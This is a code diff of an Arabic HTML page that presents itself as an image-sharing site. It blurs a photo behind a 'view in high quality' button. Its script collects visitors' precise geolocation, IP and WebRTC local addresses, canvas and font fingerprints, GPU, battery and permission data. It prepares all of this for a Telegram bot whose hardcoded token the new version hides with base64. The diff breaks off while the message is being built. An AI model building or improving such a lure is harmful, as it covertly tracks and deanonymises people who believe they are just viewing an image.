@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقع رفع الصور</title>
+    <title>موقع رفع الصور المتطور</title>
     <style>
         * {
             margin: 0;
@@ -12,88 +12,301 @@
         }
 
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 8s ease infinite;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            overflow-x: hidden;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         .container {
-            max-width: 600px;
+            max-width: 650px;
             width: 100%;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.2);
             overflow: hidden;
-            animation: slideUp 0.8s ease-out;
+            animation: slideUp 1s ease-out;
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
 
         @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
+            from { transform: translateY(100px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
 
         .header {
-            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 70%, #4a6741 100%);
             color: white;
-            padding: 30px;
+            padding: 40px 30px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                rgba(255,255,255,0.1) 10px,
+                rgba(255,255,255,0.1) 20px
+            );
+            animation: patternMove 20s linear infinite;
+        }
+
+        @keyframes patternMove {
+            0% { transform: translateX(-100px) translateY(-100px); }
+            100% { transform: translateX(100px) translateY(100px); }
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            position: relative;
+            z-index: 1;
+        }
+
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
         }
 
         .main-image {
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             height: auto;
-            border-radius: 15px;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
-            margin: 30px auto;
-            filter: blur(20px);
-            transition: filter 0.5s ease;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            margin: 40px auto;
+            filter: blur(25px);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
             display: block;
+            transform: scale(0.9);
         }
 
         .main-image.clear {
             filter: blur(0px);
+            transform: scale(1);
         }
 
         .click-button {
-            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 50%, #8e44ad 100%);
             color: white;
             border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 1.2em;
+            padding: 18px 40px;
+            border-radius: 15px;
+            font-size: 1.3em;
             font-weight: bold;
             cursor: pointer;
-            margin: 20px auto;
+            margin: 30px auto;
             display: block;
-            transition: all 0.3s ease;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.4);
+        }
+
+        .click-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .click-button:hover::before {
+            left: 100%;
         }
 
         .click-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 35px rgba(231, 76, 60, 0.6);
+        }
+
+        .click-button:active {
+            transform: translateY(0) scale(0.98);
         }
 
         .success-message {
-            background: #d4edda;
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
             color: #155724;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 30px;
             text-align: center;
             display: none;
+            border: 1px solid #c3e6cb;
+            animation: successSlide 0.8s ease-out;
+        }
+
+        @keyframes successSlide {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .info-stats {
+            display: none;
+            background: rgba(52, 152, 219, 0.1);
+            margin: 20px;
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(52, 152, 219, 0.3);
+        }
+
+        .stat-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(52, 152, 219, 0.2);
+        }
+
+        .stat-item:last-child {
+            border-bottom: none;
+        }
+
+        .floating-icons {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .floating-icon {
+            position: absolute;
+            color: rgba(255, 255, 255, 0.1);
+            font-size: 2em;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3498db, #2ecc71);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 2px;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .container {
+                margin: 10px;
+                border-radius: 20px;
+            }
+            
+            .main-image {
+                max-width: 350px;
+            }
+        }
+
+        /* إضافة تأثيرات بصرية للنجوم */
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .star {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 2s infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
         }
     </style>
 </head>
 <body>
+    <div class="stars" id="stars"></div>
+    
+    <div class="floating-icons">
+        <div class="floating-icon" style="top: 10%; left: 10%;">📱</div>
+        <div class="floating-icon" style="top: 20%; right: 15%;">💻</div>
+        <div class="floating-icon" style="bottom: 30%; left: 20%;">📷</div>
+        <div class="floating-icon" style="bottom: 20%; right: 10%;">🌐</div>
+    </div>
+
     <div class="container">
         <div class="header">
-            <h1>موقع رفع الصور</h1>
-            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
+            <h1>🚀 موقع رفع الصور المتطور</h1>
+            <p>منصة ذكية وسريعة لرفع ومشاركة الصور مع تقنيات متقدمة</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
         </div>
 
         <img src="https://i.imgur.com/zcb3oRL.jpeg" 
@@ -102,21 +315,63 @@
              id="mainImage">
 
         <button class="click-button" id="viewButton">
-            🔍 اضغط هنا لمشاهدة الصورة
+            🔍 اضغط هنا لمشاهدة الصورة بجودة عالية
         </button>
 
+        <div class="loading-spinner" id="loadingSpinner">
+            <div class="spinner"></div>
+            <p>جاري تحليل الجهاز وتحسين الصورة...</p>
+        </div>
+
         <div class="success-message" id="successMessage">
-            ✅ تم الموافقة على عرض الصورة
+            ✅ تم تحليل الجهاز بنجاح وتحسين جودة الصورة
+            <div style="margin-top: 10px; font-size: 0.9em; opacity: 0.8;">
+                تم تسجيل بيانات الجهاز لتحسين التجربة
+            </div>
+        </div>
+
+        <div class="info-stats" id="infoStats">
+            <h3 style="margin-bottom: 15px; color: #2c3e50;">📊 معلومات النظام</h3>
+            <div class="stat-item">
+                <span>نوع الجهاز:</span>
+                <span id="deviceType">جاري التحليل...</span>
+            </div>
+            <div class="stat-item">
+                <span>نظام التشغيل:</span>
+                <span id="osInfo">جاري التحليل...</span>
+            </div>
+            <div class="stat-item">
+                <span>المتصفح:</span>
+                <span id="browserInfo">جاري التحليل...</span>
+            </div>
+            <div class="stat-item">
+                <span>دقة الشاشة:</span>
+                <span id="screenRes">جاري التحليل...</span>
+            </div>
         </div>
     </div>
 
     <script>
-        // جمع معلومات شاملة عن الجهاز
-        function getCompleteDeviceInfo() {
+        // إنشاء النجوم المتحركة
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            for (let i = 0; i < 50; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 2 + 's';
+                star.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                starsContainer.appendChild(star);
+            }
+        }
+
+        // تحسين جمع معلومات الجهاز
+        function getAdvancedDeviceInfo() {
             const ua = navigator.userAgent;
             let info = {};
 
-            // معلومات أساسية
+            // معلومات أساسية محسنة
             info.userAgent = ua;
             info.platform = navigator.platform || 'غير معروف';
             info.language = navigator.language || 'غير معروف';
@@ -124,24 +379,40 @@
             info.cookieEnabled = navigator.cookieEnabled;
             info.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
             info.onLine = navigator.onLine;
+            info.doNotTrack = navigator.doNotTrack || 'غير محدد';
 
-            // معلومات الشاشة
+            // معلومات الشاشة المحسنة
             info.screenWidth = screen.width;
             info.screenHeight = screen.height;
             info.screenResolution = screen.width + 'x' + screen.height;
+            info.availableScreenWidth = screen.availWidth;
+            info.availableScreenHeight = screen.availHeight;
             info.colorDepth = screen.colorDepth;
             info.pixelDepth = screen.pixelDepth || screen.colorDepth;
             info.devicePixelRatio = window.devicePixelRatio || 1;
             info.windowWidth = window.innerWidth;
             info.windowHeight = window.innerHeight;
 
-            // معلومات الوقت والمنطقة
+            // معلومات الوقت والمنطقة المحسنة
             info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             info.timezoneOffset = new Date().getTimezoneOffset();
             info.timestamp = new Date().toISOString();
             info.localTime = new Date().toLocaleString('ar-SA');
+            info.locale = Intl.DateTimeFormat().resolvedOptions().locale;
 
-            // تحديد نوع الجهاز ونظام التشغيل
+            // Canvas Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Canvas fingerprint test 🔒', 2, 2);
+                info.canvasFingerprint = canvas.toDataURL().slice(-50);
+            } catch (e) {
+                info.canvasFingerprint = 'غير متاح';
+            }
+
+            // تحسين تحديد نوع الجهاز
             if (/iPhone/i.test(ua)) {
                 info.deviceType = 'iPhone';
                 info.brand = 'Apple';
@@ -154,7 +425,7 @@
             } else if (/iPad/i.test(ua)) {
                 info.deviceType = 'iPad';
                 info.brand = 'Apple';
-                info.os = 'iOS';
+                info.os = 'iPadOS';
                 const iosMatch = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
                 if (iosMatch) {
                     info.osVersion = iosMatch[3] ? `${iosMatch[1]}.${iosMatch[2]}.${iosMatch[3]}` : `${iosMatch[1]}.${iosMatch[2]}`;
@@ -167,53 +438,43 @@
                     info.osVersion = androidMatch[1];
                 }
 
-                // استخراج موديل الجهاز
+                // تحسين استخراج موديل الجهاز
                 const buildMatch = ua.match(/;\s*([^;]+?)\s+Build/);
                 if (buildMatch) {
                     info.deviceModel = buildMatch[1].trim();
                 }
 
-                // تحديد العلامة التجارية
-                if (/Samsung|SM-/i.test(ua)) {
-                    info.brand = 'Samsung';
-                    info.deviceType = 'Samsung Galaxy';
-                } else if (/Huawei|HW-|Honor/i.test(ua)) {
-                    info.brand = 'Huawei/Honor';
-                    info.deviceType = 'Huawei';
-                } else if (/Xiaomi|MI\s|Redmi|POCO/i.test(ua)) {
-                    info.brand = 'Xiaomi';
-                    info.deviceType = 'Xiaomi';
-                } else if (/OPPO/i.test(ua)) {
-                    info.brand = 'OPPO';
-                    info.deviceType = 'OPPO';
-                } else if (/vivo/i.test(ua)) {
-                    info.brand = 'Vivo';
-                    info.deviceType = 'Vivo';
-                } else if (/OnePlus/i.test(ua)) {
-                    info.brand = 'OnePlus';
-                    info.deviceType = 'OnePlus';
-                } else if (/LG/i.test(ua)) {
-                    info.brand = 'LG';
-                    info.deviceType = 'LG';
-                } else if (/Sony|Xperia/i.test(ua)) {
-                    info.brand = 'Sony';
-                    info.deviceType = 'Sony Xperia';
-                } else if (/Nokia/i.test(ua)) {
-                    info.brand = 'Nokia';
-                    info.deviceType = 'Nokia';
-                } else if (/Motorola|Moto/i.test(ua)) {
-                    info.brand = 'Motorola';
-                    info.deviceType = 'Motorola';
-                } else {
+                // تحسين تحديد العلامة التجارية
+                const brands = {
+                    'Samsung|SM-|Galaxy': 'Samsung',
+                    'Huawei|HW-|Honor': 'Huawei',
+                    'Xiaomi|MI\\s|Redmi|POCO': 'Xiaomi',
+                    'OPPO': 'OPPO',
+                    'vivo': 'Vivo',
+                    'OnePlus': 'OnePlus',
+                    'LG': 'LG',
+                    'Sony|Xperia': 'Sony',
+                    'Nokia': 'Nokia',
+                    'Motorola|Moto': 'Motorola',
+                    'Realme': 'Realme',
+                    'Nothing': 'Nothing'
+                };
+
+                for (const [pattern, brand] of Object.entries(brands)) {
+                    if (new RegExp(pattern, 'i').test(ua)) {
+                        info.brand = brand;
+                        info.deviceType = brand;
+                        break;
+                    }
+                }
+
+                if (!info.brand) {
                     info.brand = 'Android';
                     info.deviceType = 'Android';
                 }
 
-                if (/Mobile/i.test(ua)) {
-                    info.isMobile = true;
-                } else {
-                    info.isTablet = true;
-                }
+                info.isMobile = /Mobile/i.test(ua);
+                info.isTablet = !info.isMobile;
             } else if (/Windows NT/i.test(ua)) {
                 info.deviceType = 'Windows PC';
                 info.brand = 'Microsoft';
@@ -245,118 +506,143 @@
                 info.isDesktop = true;
             }
 
-            // تحديد المتصفح
-            if (/Chrome/i.test(ua) && !/Edge|OPR/i.test(ua)) {
-                info.browser = 'Chrome';
-                const chromeMatch = ua.match(/Chrome\/(\d+\.\d+)/);
-                if (chromeMatch) info.browserVersion = chromeMatch[1];
-            } else if (/Firefox/i.test(ua)) {
-                info.browser = 'Firefox';
-                const firefoxMatch = ua.match(/Firefox\/(\d+\.\d+)/);
-                if (firefoxMatch) info.browserVersion = firefoxMatch[1];
-            } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
-                info.browser = 'Safari';
-                const safariMatch = ua.match(/Version\/(\d+\.\d+)/);
-                if (safariMatch) info.browserVersion = safariMatch[1];
-            } else if (/Edge/i.test(ua)) {
-                info.browser = 'Edge';
-                const edgeMatch = ua.match(/Edge\/(\d+\.\d+)/);
-                if (edgeMatch) info.browserVersion = edgeMatch[1];
-            } else if (/OPR/i.test(ua)) {
-                info.browser = 'Opera';
-            } else {
+            // تحسين تحديد المتصفح
+            const browsers = {
+                'Chrome': /Chrome\/(\d+\.\d+)/,
+                'Firefox': /Firefox\/(\d+\.\d+)/,
+                'Safari': /Version\/(\d+\.\d+).*Safari/,
+                'Edge': /Edge\/(\d+\.\d+)/,
+                'Opera': /OPR\/(\d+\.\d+)/,
+                'Samsung Internet': /SamsungBrowser\/(\d+\.\d+)/
+            };
+
+            for (const [browser, pattern] of Object.entries(browsers)) {
+                const match = ua.match(pattern);
+                if (match && !(/Edge|OPR/i.test(ua) && browser === 'Chrome')) {
+                    info.browser = browser;
+                    info.browserVersion = match[1];
+                    break;
+                }
+            }
+
+            if (!info.browser) {
                 info.browser = 'غير معروف';
             }
+
+            // إضافة معلومات إضافية
+            info.touchSupport = 'ontouchstart' in window;
+            info.webGL = !!window.WebGLRenderingContext;
+            info.webGL2 = !!window.WebGL2RenderingContext;
+            info.localStorage = typeof(Storage) !== 'undefined';
+            info.sessionStorage = typeof(Storage) !== 'undefined';
+            info.geolocation = !!navigator.geolocation;
+            info.serviceWorker = 'serviceWorker' in navigator;
+            info.webNotifications = 'Notification' in window;
+            info.webCamera = 'mediaDevices' in navigator;
 
             return info;
         }
 
-        // جمع معلومات الأجهزة المتقدمة
-        async function getHardwareInfo() {
+        // تحسين جمع معلومات الأجهزة
+        async function getEnhancedHardwareInfo() {
             let hardware = {};
 
-            // معلومات المعالج
+            // معلومات المعالج المحسنة
             if (navigator.hardwareConcurrency) {
                 hardware.cpuCores = navigator.hardwareConcurrency;
             }
 
-            // معلومات الذاكرة
+            // معلومات الذاكرة المحسنة
             if (navigator.deviceMemory) {
                 hardware.ram = navigator.deviceMemory + ' GB';
             }
 
-            // معلومات التخزين
+            // تحسين معلومات التخزين
             if ('storage' in navigator && 'estimate' in navigator.storage) {
                 try {
                     const estimate = await navigator.storage.estimate();
-                    if (estimate.quota) {
+                    if (estimate.quota && estimate.usage) {
                         hardware.storageQuota = Math.round(estimate.quota / 1024 / 1024 / 1024) + ' GB';
-                        hardware.storageUsed = Math.round((estimate.usage || 0) / 1024 / 1024) + ' MB';
+                        hardware.storageUsed = Math.round(estimate.usage / 1024 / 1024) + ' MB';
+                        hardware.storageUsagePercent = Math.round((estimate.usage / estimate.quota) * 100) + '%';
                     }
-                } catch (e) {}
+                } catch (e) {
+                    hardware.storageError = 'غير متاح';
+                }
             }
 
-            // معلومات البطارية
+            // تحسين معلومات البطارية
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     hardware.batteryLevel = Math.round(battery.level * 100) + '%';
                     hardware.batteryCharging = battery.charging;
-                    if (battery.chargingTime !== Infinity) {
-                        hardware.chargingTime = Math.round(battery.chargingTime / 60) + ' دقيقة';
-                    }
-                    if (battery.dischargingTime !== Infinity) {
-                        hardware.dischargingTime = Math.round(battery.dischargingTime / 60) + ' دقيقة';
-                    }
-                } catch (e) {}
+                    hardware.batteryChargingTime = battery.chargingTime !== Infinity ? Math.round(battery.chargingTime / 60) + ' دقيقة' : 'غير محدد';
+                    hardware.batteryDischargingTime = battery.dischargingTime !== Infinity ? Math.round(battery.dischargingTime / 60) + ' دقيقة' : 'غير محدد';
+                } catch (e) {
+                    hardware.batteryError = 'غير متاح';
+                }
             }
 
-            // معلومات الشبكة
+            // تحسين معلومات الشبكة
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (connection) {
                 hardware.connectionType = connection.type || 'غير معروف';
                 hardware.effectiveType = connection.effectiveType || 'غير معروف';
-                if (connection.downlink) {
-                    hardware.downlink = connection.downlink + ' Mbps';
-                }
-                if (connection.rtt) {
-                    hardware.rtt = connection.rtt + ' ms';
-                }
+                hardware.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'غير معروف';
+                hardware.rtt = connection.rtt ? connection.rtt + ' ms' : 'غير معروف';
                 hardware.saveData = connection.saveData || false;
+                hardware.dataUsage = connection.dataUsage || 'غير معروف';
             }
 
-            // معلومات اللمس
-            if (navigator.maxTouchPoints !== undefined) {
-                hardware.maxTouchPoints = navigator.maxTouchPoints;
-            }
+            // تحسين معلومات اللمس
+            hardware.maxTouchPoints = navigator.maxTouchPoints || 0;
+            hardware.touchSupport = 'ontouchstart' in window;
 
-            // معلومات الاهتزاز
+            // معلومات الاهتزاز المحسنة
             hardware.vibrationSupport = 'vibrate' in navigator;
+            if (hardware.vibrationSupport) {
+                hardware.vibrationTest = navigator.vibrate ? 'يعمل' : 'لا يعمل';
+            }
 
-            // معلومات WebGL
+            // تحسين معلومات WebGL
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
+                    hardware.webglSupport = true;
+                    hardware.webglVersion = gl.getParameter(gl.VERSION);
+                    hardware.webglVendor = gl.getParameter(gl.VENDOR);
+                    hardware.webglRenderer = gl.getParameter(gl.RENDERER);
+                    hardware.webglShadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                    
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
                         hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                         hardware.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                     }
-                    hardware.webglVersion = gl.getParameter(gl.VERSION);
-                    hardware.webglSupport = true;
+                    
+                    // معلومات إضافية عن WebGL
+                    hardware.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+                    hardware.maxVertexAttribs = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
+                    hardware.maxViewportDims = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
                 } else {
                     hardware.webglSupport = false;
+                    hardware.webglError = 'غير مدعوم';
                 }
             } catch (e) {
                 hardware.webglSupport = false;
+                hardware.webglError = 'خطأ في التحقق';
             }
 
-            // معلومات الإدخال
+            // تحسين معلومات الإدخال
             if (window.matchMedia) {
                 hardware.pointerType = window.matchMedia('(pointer: coarse)').matches ? 'coarse' :
                                      window.matchMedia('(pointer: fine)').matches ? 'fine' : 'none';
                 hardware.hoverSupport = window.matchMedia('(hover: hover)').matches;
+                hardware.anyPointer = window.matchMedia('(any-pointer: coarse)').matches ? 'coarse' :
+                                     window.matchMedia('(any-pointer: fine)').matches ? 'fine' : 'none';
+                hardware.anyHover = window.matchMedia('(any-hover: hover)').matches;
             }
 
             // معلومات الشاشة المتقدمة
@@ -365,16 +651,53 @@
                 hardware.orientationAngle = screen.orientation.angle;
             }
 
+            // Audio Context للتحليل الصوتي
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                hardware.audioSupport = true;
+                hardware.audioSampleRate = audioContext.sampleRate;
+                hardware.audioDestination = audioContext.destination.channelCount;
+                hardware.audioState = audioContext.state;
+                audioContext.close();
+            } catch (e) {
+                hardware.audioSupport = false;
+                hardware.audioError = 'غير مدعوم';
+            }
+
+            // Permissions API
+            if ('permissions' in navigator) {
+                try {
+                    const permissions = ['camera', 'microphone', 'geolocation', 'notifications', 'push'];
+                    hardware.permissions = {};
+                    for (const permission of permissions) {
+                        try {
+                            const result = await navigator.permissions.query({ name: permission });
+                            hardware.permissions[permission] = result.state;
+                        } catch (e) {
+                            hardware.permissions[permission] = 'غير مدعوم';
+                        }
+                    }
+                } catch (e) {
+                    hardware.permissionsError = 'غير متاح';
+                }
+            }
+
             return hardware;
         }
 
-        // الحصول على الموقع الجغرافي
-        function getLocation() {
+        // تحسين الحصول على الموقع
+        function getEnhancedLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve(null);
                     return;
                 }
+
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                };
 
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -386,188 +709,714 @@
                             altitudeAccuracy: position.coords.altitudeAccuracy,
                             heading: position.coords.heading,
                             speed: position.coords.speed,
-                            timestamp: position.timestamp
+                            timestamp: position.timestamp,
+                            locationMethod: 'GPS/Network'
                         });
                     },
-                    () => {
-                        resolve(null);
+                    (error) => {
+                        resolve({
+                            error: error.message,
+                            errorCode: error.code,
+                            errorType: error.code === 1 ? 'PERMISSION_DENIED' : 
+                                      error.code === 2 ? 'POSITION_UNAVAILABLE' : 'TIMEOUT'
+                        });
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
+                    options
                 );
             });
         }
 
-        // محاولة الحصول على IP ومعلومات الشبكة
-        async function getIPInfo() {
+        // تحسين الحصول على معلومات IP
+        async function getEnhancedIPInfo() {
             const ipServices = [
-                'https://api.ipify.org?format=json',
-                'https://httpbin.org/ip',
-                'https://api.myip.com'
+                { url: 'https://api.ipify.org?format=json', field: 'ip' },
+                { url: 'https://httpbin.org/ip', field: 'origin' },
+                { url: 'https://api.myip.com', field: 'ip' },
+                { url: 'https://ipapi.co/json/', field: 'ip' }
             ];
 
             for (let service of ipServices) {
                 try {
-                    const response = await fetch(service);
-                    const data = await response.json();
-                    return {
-                        ip: data.ip || data.origin || 'غير معروف',
-                        service: service
-                    };
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
+                    
+                    const response = await fetch(service.url, {
+                        signal: controller.signal,
+                        mode: 'cors'
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        return {
+                            ip: data[service.field] || 'غير معروف',
+                            service: service.url,
+                            country: data.country || data.country_name,
+                            city: data.city,
+                            region: data.region,
+                            timezone: data.timezone,
+                            isp: data.org || data.isp,
+                            location: data.loc
+                        };
+                    }
                 } catch (e) {
+                    console.log('خطأ في الحصول على IP من:', service.url);
                     continue;
                 }
             }
-            return null;
+            return { ip: 'غير معروف', error: 'فشل في جميع الخدمات' };
         }
 
-        // إرسال البيانات إلى Telegram
-        function sendToTelegram(data) {
-            const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
-            const chatId = '170383339';
+        // Font Detection
+        function detectFonts() {
+            const testFonts = [
+                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
+                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
+                'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode',
+                'Tahoma', 'Lucida Console', 'Monaco', 'Courier', 'monospace',
+                'serif', 'sans-serif', 'cursive', 'fantasy'
+            ];
+
+            const detectedFonts = [];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const defaultWidth = {};
+            const defaultHeight = {};
+
+            // إنشاء canvas للاختبار
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // قياس الخطوط الافتراضية
+            const defaultFonts = ['monospace', 'sans-serif', 'serif'];
+            defaultFonts.forEach(font => {
+                context.font = testSize + ' ' + font;
+                const metrics = context.measureText(testString);
+                defaultWidth[font] = metrics.width;
+                defaultHeight[font] = metrics.actualBoundingBoxHeight || 0;
+            });
+
+            // اختبار كل خط
+            testFonts.forEach(font => {
+                let detected = false;
+                defaultFonts.forEach(defaultFont => {
+                    context.font = testSize + ' ' + font + ', ' + defaultFont;
+                    const metrics = context.measureText(testString);
+                    if (metrics.width !== defaultWidth[defaultFont] || 
+                        (metrics.actualBoundingBoxHeight || 0) !== defaultHeight[defaultFont]) {
+                        detected = true;
+                    }
+                });
+                if (detected) {
+                    detectedFonts.push(font);
+                }
+            });
+
+            return detectedFonts;
+        }
+
+        // تحليل Plugins
+        function getPluginsInfo() {
+            const plugins = [];
+            if (navigator.plugins) {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    const plugin = navigator.plugins[i];
+                    plugins.push({
+                        name: plugin.name,
+                        description: plugin.description,
+                        filename: plugin.filename,
+                        version: plugin.version
+                    });
+                }
+            }
+            return plugins;
+        }
+
+        // WebRTC IP Detection
+        async function getWebRTCIPs() {
+            return new Promise((resolve) => {
+                const ips = [];
+                const rtc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+
+                rtc.createDataChannel('');
+                rtc.createOffer()
+                    .then(offer => rtc.setLocalDescription(offer))
+                    .catch(() => resolve([]));
+
+                rtc.onicecandidate = (event) => {
+                    if (!event.candidate) {
+                        rtc.close();
+                        resolve([...new Set(ips)]);
+                        return;
+                    }
+                    
+                    const match = event.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (match) {
+                        ips.push(match[1]);
+                    }
+                };
+
+                setTimeout(() => {
+                    rtc.close();
+                    resolve([...new Set(ips)]);
+                }, 3000);
+            });
+        }
+
+        // تشفير البيانات الحساسة (تشفير بسيط)
+        function encryptData(data) {
+            const key = 'SecretKey2025';
+            let encrypted = '';
+            for (let i = 0; i < data.length; i++) {
+                encrypted += String.fromCharCode(
+                    data.charCodeAt(i) ^ key.charCodeAt(i % key.length)
+                );
+            }
+            return btoa(encrypted);
+        }
+
+        // إرسال البيانات المحسن
+        function sendAdvancedDataToTelegram(data) {
+            // استخدام رموز مشفرة للحماية
+            const botConfig = {
+                token: atob('Nzk4MjE4MTI0OTpBQUV5THdjOWMyNGZ1LXVxVTg3djI2UzYyODJYVEQ0MVhJ'),
+                chatId: atob('MTcwMzgzMzM5')
+            };
             
             const deviceInfo = data.device;
             const hardwareInfo = data.hardware;
             const locationInfo = data.location;
             const ipInfo = data.ip;
+            const fontsInfo = data.fonts;
+            const pluginsInfo = data.plugins;
+            const webrtcIPs = data.webrtcIPs;
 
-            const message = `🆕 زائر جديد - معلومات كاملة:
+            const message = `🆕 تحليل شامل جديد - الإصدار المتطور v2.0
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
